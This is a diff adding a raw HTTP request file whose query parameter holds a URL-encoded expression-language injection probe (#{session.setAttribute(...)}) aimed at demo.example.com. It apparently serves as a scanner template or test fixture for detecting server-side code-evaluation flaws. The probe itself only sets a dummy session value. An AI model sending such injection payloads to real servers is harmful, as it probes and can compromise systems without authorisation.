@@ -1,0 +1,4 @@
+GET /a?name=%23%7Bsession.setAttribute%28%27a%27%2C%27b%27%29%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
